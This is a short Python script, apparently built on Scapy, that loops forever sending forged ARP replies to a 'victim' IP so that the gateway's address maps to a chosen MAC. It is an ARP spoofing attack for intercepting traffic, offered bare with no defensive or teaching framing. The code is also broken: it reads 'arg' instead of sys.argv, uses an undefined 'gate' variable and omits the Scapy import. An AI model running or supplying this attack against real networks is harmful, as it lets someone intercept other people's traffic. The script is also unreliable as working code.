import sys
import time
op=2
victim= arg[1]   #'xx.xx.xx.xxx' #victim ip
gateIp=arg[2]   #xx.xx.xx.xxx' #gatewayIP
mac= arg[3] #xx:xx:xx:xx:xx:xx:xx'
arp=ARP(op=op,psrc=gate,pdst=victim,hwsrc=mac)
while 1:
	send(arp)
	time.sleep(2)